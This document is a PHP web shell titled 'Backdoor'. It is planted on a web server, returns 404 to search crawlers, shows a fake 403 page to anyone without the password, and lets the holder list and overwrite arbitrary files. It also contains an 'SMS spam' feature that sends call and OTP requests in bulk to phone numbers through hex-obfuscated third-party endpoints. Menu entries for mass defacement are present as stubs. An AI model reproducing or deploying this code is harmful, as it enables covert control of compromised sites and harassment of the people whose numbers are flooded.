<?php
/*
 * backdoor.php
 * 
 * Copyright 2018 Cvar1984 <Cvar1984@P22DX>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 * 
 * 
 */
session_start();
//set_time_limit(0);
//ini_set('error_log',0);
//ini_set('log_errors',0);
//ini_set('display_errors',0);
//ini_set('max_execution_time',0);
$auth_pass = "40c880e51dca8d68fddadff873dca125"; // 7c
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
$userAgents = array(
	"Googlebot",
	"DuckDuckBot",
	"Baiduspider",
	"Exabot",
	"SimplePie",
	"Curl",
	"OkHttp",
	"SiteLockSpider",
	"BLEXBot",
	"ScoutJet",
	"AdsBot Google Mobile",
	"Googlebot Mobile",
	"MJ12bot",
	"Slurp",
	"MSNBot",
	"PycURL",
	"facebookexternalhit",
	"facebot",
	"ia_archiver",
	"crawler",
	"YandexBot",
	"Rambler",
	"Yahoo! Slurp",
	"YahooSeeker",
	"bingbot");
if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])) {
	header('HTTP/1.0 404 Not Found');
	exit;
	}
}
function login_shell() {
?>
<title>403 Forbidden</title>
<head>
<h1>Forbidden</h1>
<p>You don't have permission to access <?php echo $_SERVER['REQUEST_URI'];?>
 on this server.</p>
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
</head>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
	if(empty($auth_pass) OR (isset($_GET['pass']) AND md5(sha1($_GET['pass'])) == $auth_pass)) {
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	} else {
		login_shell();
	}
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Backdoor</title>
<!-- CSS STYLE-->
<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<style type='text/css'>
body {
	background:black;
	color:lavender;
	}
	@font-face {
	font-family: 'Orbitron';
	font-style: normal;
	font-weight: 700;
	src: local('Orbitron Bold'), local('Orbitron-Bold'), url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2) format('woff2');
	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
	}
	li {display: inline;}
	a{
	color:lime;
	text-decoration:none;
	}
	a:hover {
	color:red;
	}
	table, tr, td {
	border:1px solid green;
	}
	.table_home, .th_home, .td_home {
	border: 1px solid green;
	font-size: 15px;
	}
	#textarea {
	background-color:black;
	color:lime;
	width: 1066px;
	height: 500px;
	font-family: Arial, Helvetica, monospace;
	color:lavender;
	}
	#menu {}
	*{font-family: 'Orbitron';}
	</style>
	</head>
<?php

// FUNCTION
function home() {
	?>
	<script>window.location='?';</script>
	<?php
}
function spamsms() {
?>
<center>
<h2>Spam SMS</h2>
<form method="post">
<textarea name="no" class="form-control" id="textarea" placeholder='No HP ex : 888218005037 ' required></textarea>
<br>
<input type="submit" name="action" class="btn btn-danger"/>
</form>
</center>
<?php
function post_data($url,$data) {
	$ch=curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	return curl_exec($ch);
	curl_close($ch);
}
if(isset($_POST['action'])) {
$no=explode("\n",$_POST['no']);
$no=str_replace(' ','',$no);
$no=str_replace("\n\n","\n",$no);
foreach($no as $on):
echo "<hr>Calling     -> ".$on."<hr><br>";
	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$on."&accept=call");
endforeach;
for($x=0;$x<100;$x++) {
foreach($no as $on):
echo "<hr>Send OTP To -> ".$on."<hr><br>";
	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$on."&smsType=1");
	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$on);
endforeach;
}
} else {
	die();
}
die();
}
function jumping() {
	alert("Kalem euy");
}
function config() {
	alert("Kalem euy");
}
function massdeface() {
	alert("Kalem euy");
}
function logout() {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	home();
}
function alert($message) {
	echo "<script>alert('".$message."')</script>";
}
function edit($filename) {
	if(isset($_POST['text'])) {
	// save the text contents
	file_put_contents($filename, $_POST['text']);
}
// read the textfile
$text=file_get_contents($filename);
?>
<!-- HTML form -->
<form action="" method="post">
	<center>
		<h2>Files Editor : <?php echo $filename;?></h2>
<textarea name="text" class="form-control" id="textarea"><?php echo htmlspecialchars($text) ?></textarea><br>
<input type="submit" class="btn btn-danger" />
</center>
</form>
<?php
die();
}
function open() {
	alert("Kalem euy");
	home();
}
// ENDFUNCTION
?>
<center>
	<div id='menu'>
		<li><a href='?do=home'>[ Home ]</a></li>
		<li><a href='?do=sms'>[ Spam SMS ]</a></li>
		<li><a href='?do=jumping'>[ Jumping ]</a></li>
		<li><a href='?do=config'>[ Config ]</a></li>
		<li><a href='?do=massdeface'>[ Mass Deface ]</a></li>
		<li><a href='?do=logout'>[ Logout ]</a></li>
	</div>
</center>
<?php
if($_GET['do'] == 'home') {
	home();
} elseif($_GET['do'] == 'sms') {
	spamsms();
} elseif($_GET['do'] == 'jumping') {
	jumping();
} elseif($_GET['do'] == 'config') {
	config();
} elseif($_GET['do'] == 'logout') {
	logout();
} elseif($_GET['do'] == 'edit' AND isset($_GET['files'])) {
	edit($_GET['files']);
} elseif($_GET['do'] == 'open' AND isset($_GET['dir'])) {
	open($_GET['dir']);
}
$dir=scandir(getcwd());
foreach($dir as $dir):
?>
<table width='70%' class='table_home' cellpadding='3' cellspacing='3' align='center'>
	<tr>
		<?php if(is_dir($dir)) {
		echo "<td><a href='?do=open&dir=$dir'>$dir</a></td>";
	} else {
		echo "<td><a href='?do=edit&files=$dir'>$dir</a></td>";
	}
	?>
	</tr>
</table>
<?php
endforeach;
